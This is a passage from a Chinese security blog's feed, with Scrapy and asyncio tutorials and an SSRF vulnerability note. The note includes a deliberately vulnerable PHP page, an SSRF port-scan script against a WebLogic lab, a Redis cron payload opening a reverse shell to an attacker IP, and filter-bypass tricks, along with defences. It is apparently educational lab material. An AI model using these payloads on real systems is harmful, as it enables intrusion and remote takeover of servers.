class="line">……省略……</span><br></pre></td></tr></table></figure><p>不难看出，我们想要的内容已经被打印出来了，但这还远远不够，我们还需要对其进行简单的解析，这里就用到了 BeautifulSoup ，有过爬虫经验的对这个库应该是不陌生了。</p><h1 id="0x03-爬取内容解析"><a href="#0x03-爬取内容解析" class="headerlink" title="0x03 爬取内容解析"></a>0x03 爬取内容解析</h1><p>接下来，想要获取到每个文章的链接，只需要对 parse 的内容进行修改，修改也很简单，基本之前写的多线程里的代码一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">      print(<span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>]))</span><br></pre></td></tr></table></figure><p>很简单的一个小爬虫，然后将爬虫运行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl  #运行命令</span><br><span class="line">2019-12-23 19:02:01 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)</span><br><span class="line">……省略……</span><br><span class="line">https://www.teamssix.com/year/191222-192227.html</span><br><span class="line">https://www.teamssix.com/year/191220-161745.html</span><br><span class="line">……省略……</span><br><span class="line">2019-12-23 19:02:04 [scrapy.core.engine] INFO: Spider closed (finished)</span><br></pre></td></tr></table></figure><p>此时就能够将我们想要的东西爬下来了，但这实现的功能还是比较简单，接下来将介绍如何使用 Scrapy 爬取每个子页面中的详细信息。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>原文链接：<a href="https://www.temassix.com/year/191224-093319.html" target="_blank" rel="noopener">https://www.temassix.com/year/191224-093319.html</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/intro/tutorial.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/intro/tutorial.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-新建项目&quot;&gt;&lt;a href=&quot;#0x00-新建项目&quot; class=&quot;headerlink&quot; title=&quot;0x00 新建项目&quot;&gt;&lt;/a&gt;0x00 新建项目&lt;/h1&gt;&lt;p&gt;在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy startproject teamssix&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;命令运行后，会自动在当前目录下生成许多文件，如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;teamssix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    │  scrapy.cfg  #scrapy的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    └─teamssix  #项目的Python模块，在这里写自己的代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  items.py  #项目定义文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  middlewares.py  #项目中间件文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  settings.py  #项目设置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  __init__.py&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ├─spiders  #在这里写爬虫代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        └─ __init__.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 1、简介与安装</title>
    <link href="https://www.teamssix.com/year/191224-092208.html"/>
    <id>https://www.teamssix.com/year/191224-092208.html</id>
    <published>2019-12-24T01:22:08.000Z</published>
    <updated>2019-12-24T02:30:15.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。</p><h3 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h3><p>Engine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。</p><a id="more"></a><h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>Scheduler 接收来自 Engine 的请求，并对请求进行排队，以便稍后在 Engine 请求时提供这些请求。</p><h3 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h3><p>Downloader 负责获取 web 页面内容并将其提供给 Engine，Engine 再将其提供给 Spiders。</p><h3 id="Spiders"><a href="#Spiders" class="headerlink" title="Spiders"></a>Spiders</h3><p>Spiders 是由 Scrapy 用户编写的自定义类，用于解析响应并从响应中提取所需要的内容。</p><h3 id="Item-Pipelines"><a href="#Item-Pipelines" class="headerlink" title="Item Pipelines"></a>Item Pipelines</h3><p>Item Pipelines 负责处理由 Spiders 提取的数据。典型的任务包括清理、验证和持久性(比如把数据存储在数据库中)。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy11.png" alt></p><p>1、Engine 从 Spiders 获取要爬行的初始请求。</p><p>2、Engine 在 Scheduler 中调度请求并请求爬行下一个请求。</p><p>3、Scheduler  将下一个请求返回给 Engine。</p><p>4、Engine 将请求发送给 Downloader，Downloader 对待请求网站进行访问。</p><p>5、Downloader 获取到响应后，将响应数据发送到 Engine。</p><p>6、Engine 接收来自 Downloader 的响应并将其发送到 Spiders 进行解析处理。</p><p>7、Spiders 处理响应后将解析到的数据发送给 Engine。</p><p>8、Engine 将处理过的数据发送到 Item Pipelines，然后将处理过的请求发送到 Scheduler，并请求爬行可能的下一个请求，该过程重复(从步骤1开始)，直到 Scheduler 不再发出请求为止。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>在安装 Scrapy 之前，建议先安装 Anaconda ，可以省去不少麻烦，Scrapy可以直接 pip 安装，值得注意的是，如果使用 Python2 开发，就需要使用 pip2 安装，使用 Python3 开发就需要使用 pip3 安装，安装命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>如果安装比较慢，可以指定国内安装源进行安装，下面的命令使用的清华源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>使用 -i 指定国内安装源后可以有效的提高下载速度。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;&lt;p&gt;下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。&lt;/p&gt;
&lt;h3 id=&quot;Engine&quot;&gt;&lt;a href=&quot;#Engine&quot; class=&quot;headerlink&quot; title=&quot;Engine&quot;&gt;&lt;/a&gt;Engine&lt;/h3&gt;&lt;p&gt;Engine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。&lt;/p&gt;
    
    </summary>
    
      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】浅谈SSRF原理及其利用</title>
    <link href="https://www.teamssix.com/year/191222-192227.html"/>
    <id>https://www.teamssix.com/year/191222-192227.html</id>
    <published>2019-12-22T11:22:27.000Z</published>
    <updated>2019-12-22T12:31:07.697Z</updated>
    
    <content type="html"><![CDATA[<p>声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。</p><h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF1.png" alt></p><h1 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h1><p>上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？</p><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。</p><h1 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h1><p>既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。</p><p>可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。</p><p>具体可能出现SSRF的地方：</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p><p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/a.php?image=(地址)</span><br></pre></td></tr></table></figure><h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/ssrf.php?url=teamssix.com</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png" alt></p><p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p><p>打开Burp，抓包发到Intruder，设置Payload位置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF3.png" alt></p><p>将载荷类型设置为number，数字范围从1-65535，开始爆破</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF4.png" alt></p><p>根据响应长度及响应码，可以判断出80、3389是开放着的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF5.png" alt></p><h2 id="2、Weblogic漏洞复现"><a href="#2、Weblogic漏洞复现" class="headerlink" title="2、Weblogic漏洞复现"></a>2、Weblogic漏洞复现</h2><p>搭建环境参考：<a href="https://blog.csdn.net/qq_36374896/article/details/84102101" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84102101</a></p><p>搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。</p><h3 id="1、漏洞存在测试"><a href="#1、漏洞存在测试" class="headerlink" title="1、漏洞存在测试"></a>1、漏洞存在测试</h3><p>Weblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF6.png" alt></p><p>可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF7.png" alt></p><p>将 operator 参数值为改为其他URL，再次进行发包测试</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF8.png" alt></p><p>把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF9.png" alt></p><p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p><h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p><p>进入 redis服务 的shell，查看内网IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash</span><br><span class="line">[root@5d9f91f455b6 /]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  </span><br><span class="line">          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:129 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</span><br></pre></td></tr></table></figure><p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">data = <span class="string">'operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span>.format(port)</span><br><span class="line">r = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Tried all'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'\n\n[+] &#123;&#125; 发现端口\n\n'</span>.format(port))</span><br></pre></td></tr></table></figure><p>执行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~# python3 ssrf_portscan.py</span><br><span class="line">[+] 6379 发现端口</span><br></pre></td></tr></table></figure><p>通过扫描发现Redis服务的默认端口6373是开放的。</p><p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.0.2:6379/test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.10.30/4444 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png" alt></p><p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p><p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF11.png" alt></p><h1 id="0x05-绕过技巧"><a href="#0x05-绕过技巧" class="headerlink" title="0x05 绕过技巧"></a>0x05 绕过技巧</h1><p>1、添加端口号：<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>2、短网址绕过：<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><p>3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换</p><p>4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://</p><p>5、可以指向任意ip的域名：xip.io</p><p>6、@    <a href="http://abc@127.0.0.1" target="_blank" rel="noopener">http://abc@127.0.0.1</a></p><h1 id="0x06-SSRF防御"><a href="#0x06-SSRF防御" class="headerlink" title="0x06 SSRF防御"></a>0x06 SSRF防御</h1><p>1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。</p><p>3、限制请求的端口为http常用的端口,比如80,443,8080,8090</p><p>4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网</p><p>5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章<br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a><br><a href="http://www.liuwx.cn/penetrationtest-3.html" target="_blank" rel="noopener">http://www.liuwx.cn/penetrationtest-3.html</a><br><a href="https://www.cnblogs.com/yuzly/p/10903398.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10903398.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br><a href="https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。&lt;/p&gt;
&lt;h1 id=&quot;0x00-漏洞说明&quot;&gt;&lt;a href=&quot;#0x00-漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞说明&quot;&gt;&lt;/a&gt;0x00 漏洞说明&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="SSRF" scheme="https://www.teamssix.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>【Python 学习笔记】 异步IO (asyncio) 协程</title>
    <link href="https://www.teamssix.com/year/191220-161745.html"/>
    <id>https://www.teamssix.com/year/191220-161745.html</id>
    <published>2019-12-20T08:17:45.000Z</published>
    <updated>2019-12-24T02:32:48.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。</p><p>可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。</p><p>在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。</p><p>今天就来看看协程能不能干掉多线程和多进程。</p><a id="more"></a><h1 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h1><p>Python 的在 3.4 中引入了协程的概念，3.5 则确定了协程的语法，所以想使用协程处理 IO ，需要Python3.5 及以上的版本，下面是一个简单示例代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(t)</span>:</span></span><br><span class="line">    print(<span class="string">'开始第'</span>, t,<span class="string">'个任务'</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(t)  <span class="comment">#等待t秒</span></span><br><span class="line">    print(<span class="string">'第'</span>, t, <span class="string">'个任务执行了'</span>, t, <span class="string">'秒'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></span><br><span class="line">    tasks = [loop.create_task(job(t)) <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>)]     <span class="comment">#创建多个任务</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)    <span class="comment">#运行刚才创建的那些任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = asyncio.get_event_loop()    <span class="comment">#创建事件循环</span></span><br><span class="line">    loop.run_until_complete(main(loop))    <span class="comment">#运行刚才创建的事件循环</span></span><br><span class="line">    loop.close()</span><br><span class="line">    print(<span class="string">"所有总共耗时"</span>, time.time() - start_time)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 